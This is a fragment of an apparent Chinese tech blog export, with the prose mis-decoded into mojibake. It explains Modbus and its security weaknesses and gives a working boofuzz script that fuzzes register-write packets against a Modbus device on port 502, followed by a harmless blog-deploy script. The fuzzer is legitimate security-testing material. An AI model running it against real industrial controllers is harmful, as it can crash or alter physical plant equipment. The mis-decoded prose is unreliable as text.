å‘½ä»¤èƒ½æŒ‡æŒ¥ä¸€ä¸ª RTU æ”¹å˜å®ƒçš„å¯„å­˜å™¨çš„æŸä¸ªå€¼ï¼Œæ§åˆ¶æˆ–è€…è¯»å–ä¸€ä¸ª I&#x2F;O ç«¯å£ï¼Œä»¥åŠæŒ‡æŒ¥è®¾å¤‡å›é€ä¸€ä¸ªæˆ–è€…å¤šä¸ªå…¶å¯„å­˜å™¨ä¸­çš„æ•°æ®ã€‚</p><p>æœ‰è®¸å¤š modems å’Œç½‘å…³æ”¯æŒ Modbus åè®®ï¼Œå› ä¸º Modbus åè®®å¾ˆç®€å•è€Œä¸”å®¹æ˜“å¤åˆ¶ã€‚å®ƒä»¬å½“ä¸­ä¸€äº›ä¸ºè¿™ä¸ªåè®®ç‰¹åˆ«è®¾è®¡çš„ã€‚æœ‰ä½¿ç”¨æœ‰çº¿ã€æ— çº¿é€šä¿¡ç”šè‡³çŸ­æ¶ˆæ¯å’Œ GPRS çš„ä¸åŒå®ç°ã€‚ä¸è¿‡è®¾è®¡è€…éœ€è¦å…‹æœä¸€äº›åŒ…æ‹¬é«˜å»¶è¿Ÿå’Œæ—¶åºçš„é—®é¢˜ã€‚</p></blockquote><h2 id="å®‰å…¨æ€§"><a href="#å®‰å…¨æ€§" class="headerlink" title="å®‰å…¨æ€§"></a>å®‰å…¨æ€§</h2><p>Modbus å½“åˆè®¾è®¡çš„æ—¶å€™ï¼Œä¸»è¦ç€é‡ä¸¤ç‚¹ï¼Œåˆ†åˆ«æ˜¯ç®€å•ï¼æ˜“äºå„é¡¹ç³»ç»Ÿæˆ–æ˜¯è®¾å¤‡ä¸Šçš„å®ç°ä¸å„é¡¹ç³»ç»Ÿæ‰€éœ€æ±‚çš„èµ„æºè¾ƒä½ï¼Œä»¥åˆ©é™ä½æˆæœ¬ï¼Œ å¦ä¸€åˆ™æ˜¯é€šç”¨ï¼ä¾¿äºé›†æˆå„å¼å„æ ·è®¾å¤‡æˆ–æ˜¯å¹³å°ï¼ŒåŒæ ·åœ°ï¼Œè¿™æ ·ä¹Ÿå¸¦æ¥ä¸€äº›ç¼ºç‚¹ï¼Œä»ä¿¡æ¯å®‰å…¨çš„è§’åº¦ä¸Šå»è§£æå¯å‘ç°å…·æœ‰ä¸‰ä¸ªä¸»è¦çš„å¼±ç‚¹ï¼š</p><ol><li>æ²¡æœ‰ä¿æŠ¤æœºåˆ¶ï¼æŒ‡ä»¤æ˜ç ä¼ è¾“(é€è¿‡ç¬¬ä¸‰æ–¹æ•°æ®åŒ…ä¾§å½•è½¯ä»¶å°±å¯ä»¥æˆªå–æ•°æ®åŒ…å†…å®¹ï¼Œæ— é¡»è§£å¯†)ã€‚</li><li>æ²¡æœ‰è®¤è¯æœºåˆ¶ï¼ç¬¦åˆè§„èŒƒå°±æ‰§è¡Œ (åªè¦ç¬¦åˆ Modbus è§„èŒƒä¹‹æ•°æ®åŒ…ä¼ è¾“ä¾¿å¯é€è¿‡ç¬¬ä¸‰æ–¹æ§åˆ¶è½¯ä»¶ç›‘æ§æ¥å—ç«¯è®¾å¤‡)</li><li>æœ‰å¯èƒ½æœ‰å®ç°ä¸Šçš„é—®é¢˜(é’ˆå¯¹æœªå®šä¹‰å‚è€ƒä½ç½®è¾“å…¥æŒ‡ä»¤å€¼ï¼Œå¯èƒ½é€ æˆæ¥æ”¶ç«¯ä¼ è¾“å¼‚å¸¸è¿›è€Œç˜«ç—ªæ¥æ”¶ç«¯è®¾å¤‡)ã€‚</li></ol><h2 id="Modbus-TCP"><a href="#Modbus-TCP" class="headerlink" title="Modbus TCP"></a>Modbus TCP</h2><ul><li><a href="https://www.ad.siemens.com.cn/productportal/Prods/published/Comm/Comm_9.1/Comm_9.1.html">Modbus TCP æ¦‚è¿°</a></li></ul><p><img src="Pasted%20image%2020250105154507.png" alt="Pasted image 20250105154507"></p><!--  --><p><img src="Pasted%20image%2020250105154646.png" alt="Pasted image 20250105154646"></p><p>ç”±äºä½¿ç”¨ä»¥å¤ªç½‘ TCP&#x2F;IP æ•°æ®é“¾è·¯å±‚çš„æ ¡éªŒæœºåˆ¶è€Œä¿è¯äº†æ•°æ®çš„å®Œæ•´æ€§ï¼ŒMODBUS TCP æŠ¥æ–‡ä¸­ä¸å†å¸¦æœ‰æ•°æ®æ ¡éªŒâ€CHECKSUMâ€ï¼ŒåŸæœ‰æŠ¥æ–‡ä¸­çš„â€œADDRESSâ€ä¹Ÿè¢«â€œUNIT IDâ€æ›¿ ä»£è€ŒåŠ åœ¨ MODBUS åº”ç”¨åè®®æŠ¥æ–‡å¤´ä¸­ã€‚</p><p>å­—æ®µè¯¦è§£</p><p><strong>1. MBAP å¤´ï¼ˆModbus Application Protocol Headerï¼‰</strong></p><p>MBAP å¤´æ˜¯ Modbus TCP ç‰¹æœ‰çš„å­—æ®µï¼Œç”¨äºæ ‡è¯†æŠ¥æ–‡ã€‚</p><ul><li><strong>Transaction IDï¼ˆäº‹åŠ¡æ ‡è¯†ç¬¦ï¼Œ2 å­—èŠ‚ï¼‰</strong>ï¼š<ul><li>ç”¨äºæ ‡è¯†ä¸€æ¬¡é€šä¿¡äº‹åŠ¡ã€‚</li><li>å®¢æˆ·ç«¯ç”Ÿæˆï¼ŒæœåŠ¡å™¨åœ¨å“åº”æ—¶è¿”å›ç›¸åŒçš„å€¼ã€‚</li><li>ç”¨äºåŒ¹é…è¯·æ±‚å’Œå“åº”ã€‚</li></ul></li><li><strong>Protocol IDï¼ˆåè®®æ ‡è¯†ç¬¦ï¼Œ2 å­—èŠ‚ï¼‰</strong>ï¼š<ul><li>å›ºå®šä¸º <code>0x0000</code>ï¼Œè¡¨ç¤º Modbus åè®®ã€‚</li></ul></li><li><strong>Lengthï¼ˆé•¿åº¦ï¼Œ2 å­—èŠ‚ï¼‰</strong>ï¼š<ul><li>è¡¨ç¤ºåç»­æ•°æ®çš„é•¿åº¦ï¼ˆåŒ…æ‹¬ Unit ID å’Œ PDUï¼‰ã€‚</li><li>è®¡ç®—å…¬å¼ï¼š<code>Length = 1 (Unit ID) + PDU é•¿åº¦</code>ã€‚</li></ul></li><li><strong>Unit IDï¼ˆå•å…ƒæ ‡è¯†ç¬¦ï¼Œ1 å­—èŠ‚ï¼‰</strong>ï¼š<ul><li>ç”¨äºæ ‡è¯†ç›®æ ‡è®¾å¤‡ï¼ˆå¦‚ä»ç«™åœ°å€ï¼‰ã€‚</li><li>åœ¨ Modbus TCP ä¸­ï¼Œé€šå¸¸è®¾ç½®ä¸º <code>0xFF</code> æˆ– <code>0x00</code>ï¼Œè¡¨ç¤ºå¹¿æ’­æˆ–é»˜è®¤è®¾å¤‡ã€‚</li></ul></li></ul><p><strong>2. PDUï¼ˆProtocol Data Unitï¼‰</strong></p><p>PDU åŒ…å« Modbus åŠŸèƒ½ç å’Œæ•°æ®ã€‚</p><ul><li><strong>Function Codeï¼ˆåŠŸèƒ½ç ï¼Œ1 å­—èŠ‚ï¼‰</strong>ï¼š<ul><li>è¡¨ç¤º Modbus æ“ä½œç±»å‹ã€‚</li><li>å¸¸è§åŠŸèƒ½ç ï¼š<ul><li><code>0x01</code>ï¼šè¯»å–çº¿åœˆçŠ¶æ€ï¼ˆRead Coilsï¼‰ã€‚</li><li><code>0x03</code>ï¼šè¯»å–ä¿æŒå¯„å­˜å™¨ï¼ˆRead Holding Registersï¼‰ã€‚</li><li><code>0x05</code>ï¼šå†™å•ä¸ªçº¿åœˆï¼ˆWrite Single Coilï¼‰ã€‚</li><li><code>0x06</code>ï¼šå†™å•ä¸ªå¯„å­˜å™¨ï¼ˆWrite Single Registerï¼‰ã€‚</li><li><code>0x10</code>ï¼šå†™å¤šä¸ªå¯„å­˜å™¨ï¼ˆWrite Multiple Registersï¼‰ã€‚</li></ul></li></ul></li><li><strong>Dataï¼ˆæ•°æ®ï¼Œå¯å˜é•¿åº¦ï¼‰</strong>ï¼š<ul><li>åŒ…å«åŠŸèƒ½ç æ‰€éœ€çš„å‚æ•°æˆ–å“åº”æ•°æ®ã€‚</li><li>å…·ä½“å†…å®¹å–å†³äºåŠŸèƒ½ç ã€‚</li></ul></li></ul><h3 id="ä»¿çœŸ"><a href="#ä»¿çœŸ" class="headerlink" title="ä»¿çœŸ"></a>ä»¿çœŸ</h3><p>ç”¨åˆ°<code>Modubs Poll</code>ä¸<code>Modbus Slave</code>å·¥å…·</p><p>0x06 åŠŸèƒ½ç æ¼”ç¤º<br><img src="Pasted%20image%2020250105160621.png" alt="Pasted image 20250105160621"></p><h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><ul><li><a href="https://github.com/uknowsec/ModbusPeachPit/blob/master/Peach%E5%AF%B9Modbus%E5%8A%9F%E8%83%BD%E7%A0%81%E7%9A%84%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95.md">ModbusPeachPit&#x2F;Peach å¯¹ Modbus åŠŸèƒ½ç çš„æ¨¡ç³Šæµ‹è¯•.md at master Â· uknowsec&#x2F;ModbusPeachPit</a></li><li><a href="https://infosecwriteups.com/intro-to-fuzzing-iot-protocols-using-boofuzz-02bab66454a7">Intro to Fuzzing IoT Protocols using BooFuzz</a></li></ul><p>å¯ä»¥ fuzz çš„å­—æ®µï¼ˆé’ˆå¯¹æ¯ä¸€ä¸ª<code>Function Code</code>ï¼Œ<code>UnitID</code>ä¸<code>RefNumber</code>éƒ½æ˜¯è¦åˆæ³•çš„ï¼Œè¿™é‡Œä¸è¿›è¡Œå˜å¼‚ï¼‰</p><ul><li>Transaction ID</li><li>Data</li></ul><p>boofuzz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> boofuzz <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-comment"># HOST = &quot;127.0.0.1&quot;</span><br>HOST = <span class="hljs-string">&quot;192.168.31.29&quot;</span><br>PORT = <span class="hljs-number">502</span><br>SLEEP = <span class="hljs-number">0</span><br>RECV_TIMEOUT = <span class="hljs-number">2</span><br><br>target = Target(connection=TCPSocketConnection(host=HOST, port=PORT))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkAliveAndRestart</span>(<span class="hljs-params">target, fuzz_data_logger, session, sock, *args,</span><br><span class="hljs-params">                         **kwargs</span>):<br>    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    IS_CONNECTED = SOCKET.connect_ex((HOST, PORT))<br>    SOCKET.close()<br>    <span class="hljs-comment"># Connection Lost</span><br>    <span class="hljs-keyword">if</span> IS_CONNECTED != <span class="hljs-number">0</span>:<br>        fuzz_data_logger.log_error(description=<span class="hljs-string">&quot;Crash Detected: &quot;</span> +<br>                                   fuzz_data_logger.most_recent_test_id)<br>        <span class="hljs-keyword">import</span> os<br>        os._exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        May be restart process after crash ?</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br><br><br>SESSION = Session(target=target,<br>                  post_test_case_callbacks=[checkAliveAndRestart],<br>                  restart_callbacks=[checkAliveAndRestart])<br><br><br><span class="hljs-comment"># Fuzz Read Coil function of Modbus Protocol</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">FuzzReadCoilMemory</span>():<br>    s_initialize(<span class="hljs-string">&quot;modbus_read_coil&quot;</span>)<br>    s_word(<span class="hljs-number">0x0001</span>, name=<span class="hljs-string">&#x27;Transaction ID&#x27;</span>, fuzzable=<span class="hljs-literal">True</span>, endian=BIG_ENDIAN)<br>    s_word(<span class="hljs-number">0x0000</span>, name=<span class="hljs-string">&#x27;Protocol ID&#x27;</span>, fuzzable=<span class="hljs-literal">False</span>, endian=BIG_ENDIAN)<br>    s_size(block_name=<span class="hljs-string">&quot;Modbus&quot;</span>, length=<span class="hljs-number">2</span>, endian=BIG_ENDIAN, fuzzable=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">with</span> s_block(name=<span class="hljs-string">&#x27;Modbus&#x27;</span>):<br>        s_byte(value=<span class="hljs-string">b&#x27;\x01&#x27;</span>, name=<span class="hljs-string">&#x27;UnitID&#x27;</span>, fuzzable=<span class="hljs-literal">False</span>)<br>        s_byte(value=<span class="hljs-string">b&#x27;\x06&#x27;</span>, name=<span class="hljs-string">&#x27;FuncCode&#x27;</span>, fuzzable=<span class="hljs-literal">False</span>)<br>        s_bytes(value=<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>, name=<span class="hljs-string">&#x27;RefNumber&#x27;</span>, size=<span class="hljs-number">2</span>, fuzzable=<span class="hljs-literal">True</span>)<br>        s_bytes(value=<span class="hljs-string">b&#x27;\x00\x0a&#x27;</span>, name=<span class="hljs-string">&#x27;Data&#x27;</span>, size=<span class="hljs-number">2</span>, fuzzable=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-comment"># s_word(0x0006, name=&#x27;Length&#x27;, fuzzable=True, endian=BIG_ENDIAN)</span><br>    <span class="hljs-comment"># s_byte(0x00, name=&#x27;Unit Identifier&#x27;, fuzzable=False, endian=BIG_ENDIAN)</span><br><br>    <span class="hljs-comment"># s_byte(0x01,</span><br>    <span class="hljs-comment">#        name=&#x27;Function Code for Read Coil Memory&#x27;,</span><br>    <span class="hljs-comment">#        fuzzable=False,</span><br>    <span class="hljs-comment">#        endian=BIG_ENDIAN)</span><br>    <span class="hljs-comment"># s_word(0x0000, name=&#x27;Start Address&#x27;, fuzzable=True, endian=BIG_ENDIAN)</span><br>    <span class="hljs-comment"># s_word(0x0001,</span><br>    <span class="hljs-comment">#        name=&#x27;Amount of Coils to Read&#x27;,</span><br>    <span class="hljs-comment">#        fuzzable=True,</span><br>    <span class="hljs-comment">#        endian=BIG_ENDIAN)</span><br><br>    SESSION.connect(s_get(<span class="hljs-string">&quot;modbus_read_coil&quot;</span>))<br>    SESSION.fuzz()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    FuzzReadCoilMemory()<br><br></code></pre></td></tr></table></figure><p><img src="Pasted%20image%2020250105175900.png" alt="Pasted image 20250105175900"></p><p>é’ˆå¯¹ä¸åŒåŠŸèƒ½ç çš„ fuzz</p><ul><li><a href="https://github.com/youngcraft/boofuzz-modbus/blob/master/fuzz_modbus.py">boofuzz-modbus&#x2F;fuzz_modbus.py at master Â· youngcraft&#x2F;boofuzz-modbus</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Fuzzing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸ªäººç«™ç‚¹æ­å»º</title>
    <link href="/2024/12/20/%E4%B8%AA%E4%BA%BA%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA/"/>
    <url>/2024/12/20/%E4%B8%AA%E4%BA%BA%E7%AB%99%E7%82%B9%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>Jekyll å¯ä»¥åˆ©ç”¨ GitHub Actions æ¥å®ç°è¿œç¨‹æ„å»ºå’Œéƒ¨ç½²ã€‚è¿™ç§æ–¹å¼éå¸¸é€‚åˆè‡ªåŠ¨åŒ–ç”Ÿæˆå’Œéƒ¨ç½²é™æ€ç½‘ç«™ã€‚</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>ä¸»é¢˜</p><ul><li><a href="https://chirpy.cotes.page/posts/getting-started/#setting-up-the-environment">https://chirpy.cotes.page/posts/getting-started/#setting-up-the-environment</a></li></ul><p><img src="image-20241214015958885.png" alt="image-20241214015958885"></p><h2 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>å›¾ç‰‡</p><p>ä½ç½®ï¼š<code>/assets/images/$&#123;filename&#125;</code></p><h2 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># ç§»åŠ¨åˆ°ä¸Šçº§ç›®å½•</span><br><span class="hljs-built_in">cd</span> ../ || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cd ../ failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># æ‰§è¡Œ Prettier æ ¼å¼åŒ–</span><br>npx prettier --write <span class="hljs-string">&quot;./_posts/*.md&quot;</span> || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Prettier format failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># æ·»åŠ æ‰€æœ‰æ›´æ”¹</span><br>git add . || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git add failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># è·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´</span><br>commit_message=$(<span class="hljs-built_in">date</span> +<span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)<br><br><span class="hljs-comment"># æäº¤æ›´æ”¹</span><br>git commit -m <span class="hljs-string">&quot;<span class="hljs-variable">$commit_message</span>&quot;</span> || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git commit failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># æ¨é€æ›´æ”¹</span><br>git push || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git push failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;æ‰€æœ‰å‘½ä»¤æ‰§è¡ŒæˆåŠŸ&quot;</span><br></code></pre></td></tr></table></figure><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>Markdownæ–‡æ¡£æ ¼å¼åŒ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npx prettier --write _posts/2024-12-14-ä½¿ç”¨jekyllè‡ªåŠ¨åŒ–æ„å»ºç«™ç‚¹.md<br></code></pre></td></tr></table></figure><hr><h2 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h2><p>ä¸ªäººç”µè„‘åˆ‡æ¢åˆ°MBA M3åï¼Œå‘ç°æ€§èƒ½æš´å¢ï¼Œé‚ç»§ç»­ä½¿ç”¨Hexoã€‚éƒ¨ç½²ä½¿ç”¨<code>git</code>çš„æ–¹å¼å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># ç§»åŠ¨åˆ°ä¸Šçº§ç›®å½•</span><br><span class="hljs-built_in">cd</span> ../ || &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;cd ../ failed&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br>&#125;<br><br><span class="hljs-comment"># æ‰§è¡Œ Prettier æ ¼å¼åŒ–</span><br>npx prettier --write <span class="hljs-string">&quot;./source/_posts/*.md&quot;</span> || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Prettier format failed&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># æœ¬åœ°é¢„è§ˆ</span><br>hexo s<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>About</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
